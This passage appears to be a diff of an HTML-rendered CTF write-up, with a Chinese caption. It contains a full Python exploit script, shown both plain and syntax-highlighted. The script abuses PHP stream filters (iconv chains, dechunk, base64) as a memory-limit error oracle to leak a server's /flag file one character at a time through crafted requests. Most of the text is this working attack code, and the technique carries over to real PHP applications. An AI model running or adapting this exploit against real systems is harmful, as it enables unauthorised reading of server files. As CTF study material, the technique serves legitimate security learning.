-                  err(f&#39;bad num (&#123;ss&#125;)&#39;)
-          elif s == &#39;N&#39;:
-              # 4 - 7
-              prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#39;
-              ss = find_letter(prefix)
-              if ss in &#39;CDEFGH&#39;:
-                  letter = &#39;4&#39;
-              elif ss in &#39;STUVWX&#39;:
-                  letter = &#39;5&#39;
-              elif ss in &#39;ijklmn&#39;:
-                  letter = &#39;6&#39;
-              elif ss in &#39;yz*&#39;:
-                  letter = &#39;7&#39;
-              else:
-                  err(f&#39;bad num (&#123;ss&#125;)&#39;)
-          elif s == &#39;O&#39;:
-              # 8 - 9
-              prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#39;
-              ss = find_letter(prefix)
-              if ss in &#39;CDEFGH&#39;:
-                  letter = &#39;8&#39;
-              elif ss in &#39;STUVWX&#39;:
-                  letter = &#39;9&#39;
-              else:
-                  err(f&#39;bad num (&#123;ss&#125;)&#39;)
-          else:
-              err(&#39;wtf&#39;)
-  
-      print(end=letter)
-      o += letter
-      sys.stdout.flush()
-  
-  &quot;&quot;&quot;
-  We are done!! :)
-  &quot;&quot;&quot;
-  
-  print()
-  d = b64decode(o.encode() + b&#39;=&#39; * 4)
-  # remove KR padding
-  d = d.replace(b&#39;$)C&#39;,b&#39;&#39;)
-  print(b64decode(d))
-</code></pre>
-</li>
+<li><p>引发服务器500错误，观察PHP过滤器的行为，创建过滤器链进行攻击</p>
+  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> sys
+<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode
+
+<span class="token triple-quoted-string string">"""
+THE GRAND IDEA:
+We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE
+filter will blow up the string length by 4x every time it is used, which will quickly cause
+500 error if and only if the string is non empty. So we now have an oracle that tells us if
+the string is empty.
+
+THE GRAND IDEA 2:
+The dechunk filter is interesting.
+https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724
+It looks like it was implemented for something http related, but for our purposes, the interesting
+behavior is that if the string contains no newlines, it will wipe the entire string if and only if
+the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our
+above oracle! In fact we can verify that since the flag starts with D that the filter chain
+
+dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE
+
+does not cause a 500 error.
+
+THE REST:
+So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent
+into madness trying to figure out ways to:
+- somehow get other characters not at the start of the flag file to the front
+- detect more precisely which character is at the front
+"""</span>
+
+<span class="token keyword">def</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">return</span> <span class="token string">'|'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">err</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+	<span class="token keyword">raise</span> ValueError
+
+<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	param <span class="token operator">=</span> <span class="token string">'&#123;&#125;'</span>
+	data <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>param<span class="token punctuation">&#125;</span></span><span class="token string">&amp;secret=php://filter/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">&#125;</span></span><span class="token string">/resource=/flag'</span></span>
+
+	<span class="token keyword">return</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'http://IP+PORT/index.php?my[secret.flag=C:8:"Saferman":0:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span>
+
+<span class="token triple-quoted-string string">"""
+Step 1:
+The second step of our exploit only works under two conditions:
+- String only contains a-zA-Z0-9
+- String ends with two equals signs
+
+base64-encoding the flag file twice takes care of the first condition.
+
+We don't know the length of the flag file, so we can't be sure that it will end with two equals
+signs.
+
+Repeated application of the convert.quoted-printable-encode will only consume additional
+memory if the base64 ends with equals signs, so that's what we are going to use as an oracle here.
+If the double-base64 does not end with two equals signs, we will add junk data to the start of the
+flag with convert.iconv..CSISO2022KR until it does.
+"""</span>
+
+blow_up_enc <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token string">'convert.quoted-printable-encode'</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>
+blow_up_utf32 <span class="token operator">=</span> <span class="token string">'convert.iconv.L1.UCS-4LE'</span>
+blow_up_inf <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span>blow_up_utf32<span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>
+
+header <span class="token operator">=</span> <span class="token string">'convert.base64-encode|convert.base64-encode'</span>
+
+<span class="token comment"># Start get baseline blowup</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Calculating blowup'</span><span class="token punctuation">)</span>
+baseline_blowup <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	payload <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span>blow_up_utf32<span class="token punctuation">]</span><span class="token operator">*</span>n<span class="token punctuation">)</span>
+	<span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		baseline_blowup <span class="token operator">=</span> n
+		<span class="token keyword">break</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+	err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'baseline blowup is </span><span class="token interpolation"><span class="token punctuation">&#123;</span>baseline_blowup<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+
+trailer <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span>blow_up_utf32<span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>baseline_blowup<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">assert</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>trailer<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">False</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'detecting equals'</span><span class="token punctuation">)</span>
+j <span class="token operator">=</span> <span class="token punctuation">[</span>
+	req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'convert.base64-encode|convert.base64-encode|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_enc<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>trailer<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+	req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_enc<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>trailer<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+	req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_enc<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>trailer<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+<span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+<span class="token keyword">if</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
+	err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> j<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>
+	header <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode'</span></span>
+<span class="token keyword">elif</span> j<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>
+	header <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode'</span></span>
+<span class="token keyword">elif</span> j<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>
+	header <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'convert.base64-encode|convert.base64-encode'</span></span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+	err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'j: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'header: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+
+<span class="token triple-quoted-string string">"""
+Step two:
+Now we have something of the form
+[a-zA-Z0-9 things]==
+
+Here the pain begins. For a long time I was trying to find something that would allow me to strip
+successive characters from the start of the string to access every character. Maybe something like
+that exists but I couldn't find it. However, if you play around with filter combinations you notice
+there are filters that *swap* characters:
+
+convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
+abcdefgh -> badcfehg
+
+convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:
+abcdefgh -> dcbahgfe
+
+This allows us to access the first four characters of the string. Can we do better? It turns out
+YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff>&lt;0xfe> to the start of
+the string:
+
+abcdefgh -> &lt;0xff>&lt;0xfe>abcdefgh
+
+The idea being that if we now use the r4 gadget, we get something like:
+ba&lt;0xfe>&lt;0xff>fedc
+
+And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid
+&lt;0xfe>&lt;0xff> to get:
+bafedc
+
+And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th
+characters of the string. There's only one problem: our r4 gadget requires that the string length
+is a multiple of 4. The original base64 string will be a multiple of four by definition, so when
+we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no
+good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it
+turns out, if we apply the filter
+convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7
+
+It will turn the == into:
++---AD0-3D3D+---AD0-3D3D
+
+And this is magic, because this corrects such that when we apply the
+convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!
+
+Let's recap. We have a string like:
+abcdefghij==
+
+Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:
+abcdefghij+---AD0-3D3D+---AD0-3D3D
+
+Apply convert.iconv.CSUNICODE.CSUNICODE:
+&lt;0xff>&lt;0xfe>abcdefghij+---AD0-3D3D+---AD0-3D3D
+
+Apply r4 gadget:
+ba&lt;0xfe>&lt;0xff>fedcjihg---+-0DAD3D3---+-0DAD3D3
+
+Apply base64-decode | base64-encode, so the '-' and high bytes will disappear:
+bafedcjihg+0DAD3D3+0DAD3Dw==
+
+Then apply r4 once more:
+efabijcd0+gh3DAD0+3D3DAD==wD
+
+And here's the cute part: not only have we now accessed the 5th and 6th chars of the string, but
+the string still has two equals signs in it, so we can reapply the technique as many times as we
+want, to access all the characters in the string ;)
+"""</span>
+
+flip <span class="token operator">=</span> <span class="token string">"convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode"</span>
+r2 <span class="token operator">=</span> <span class="token string">"convert.iconv.CSUNICODE.UCS-2BE"</span>
+r4 <span class="token operator">=</span> <span class="token string">"convert.iconv.UCS-4LE.10646-1:1993"</span>
+
+<span class="token keyword">def</span> <span class="token function">get_nth</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">global</span> flip<span class="token punctuation">,</span> r2<span class="token punctuation">,</span> r4
+	o <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+	chunk <span class="token operator">=</span> n <span class="token operator">//</span> <span class="token number">2</span>
+	<span class="token keyword">if</span> chunk <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> o<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r4<span class="token punctuation">)</span>
+	o<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span>flip<span class="token punctuation">,</span> r4<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>chunk <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>chunk <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> o<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r2<span class="token punctuation">)</span>
+	<span class="token keyword">return</span> join<span class="token punctuation">(</span><span class="token operator">*</span>o<span class="token punctuation">)</span>
+
+<span class="token triple-quoted-string string">"""
+Step 3:
+This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first
+char is 0-9A-Fa-f. So it's just a matter of finding filters which translate to or from those
+chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but
+I just bruteforced every combination of iconv filters to find these.
+
+Numbers are a bit trickier because iconv doesn't tend to touch them.
+In the CTF you coud porbably just guess from there once you have the letters. But if you actually 
+want a full leak you can base64 encode a third time and use the first two letters of the resulting
+string to figure out which number it is.
+"""</span>
+
+rot1 <span class="token operator">=</span> <span class="token string">'convert.iconv.437.CP930'</span>
+be <span class="token operator">=</span> <span class="token string">'convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode'</span>
+o <span class="token operator">=</span> <span class="token string">''</span>
+
+<span class="token keyword">def</span> <span class="token function">find_letter</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">if</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># a-f A-F 0-9</span>
+		<span class="token keyword">if</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token comment"># a-e</span>
+			<span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+				<span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|'</span></span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|'</span></span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+					<span class="token keyword">return</span> <span class="token string">'edcba'</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span>
+					<span class="token keyword">break</span>
+			<span class="token keyword">else</span><span class="token punctuation">:</span>
+				err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
+		<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token comment"># A-E</span>
+			<span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+				<span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|'</span></span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|'</span></span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+					<span class="token keyword">return</span> <span class="token string">'EDCBA'</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span>
+					<span class="token keyword">break</span>
+			<span class="token keyword">else</span><span class="token punctuation">:</span>
+				err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
+		<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|convert.iconv.CSISO5427CYRILLIC.855|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> <span class="token string">'*'</span>
+		<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token comment"># f</span>
+			<span class="token keyword">return</span> <span class="token string">'f'</span>
+		<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token comment"># F</span>
+			<span class="token keyword">return</span> <span class="token string">'F'</span>
+		<span class="token keyword">else</span><span class="token punctuation">:</span>
+			err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># n-s N-S</span>
+		<span class="token keyword">if</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token comment"># n-r</span>
+			<span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+				<span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|'</span></span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|'</span></span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+					<span class="token keyword">return</span> <span class="token string">'rqpon'</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span>
+					<span class="token keyword">break</span>
+			<span class="token keyword">else</span><span class="token punctuation">:</span>
+				err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
+		<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|string.tolower|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token comment"># N-R</span>
+			<span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+				<span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|string.tolower|'</span></span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|'</span></span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+					<span class="token keyword">return</span> <span class="token string">'RQPON'</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span>
+					<span class="token keyword">break</span>
+			<span class="token keyword">else</span><span class="token punctuation">:</span>
+				err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
+		<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token comment"># s</span>
+			<span class="token keyword">return</span> <span class="token string">'s'</span>
+		<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token comment"># S</span>
+			<span class="token keyword">return</span> <span class="token string">'S'</span>
+		<span class="token keyword">else</span><span class="token punctuation">:</span>
+			err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
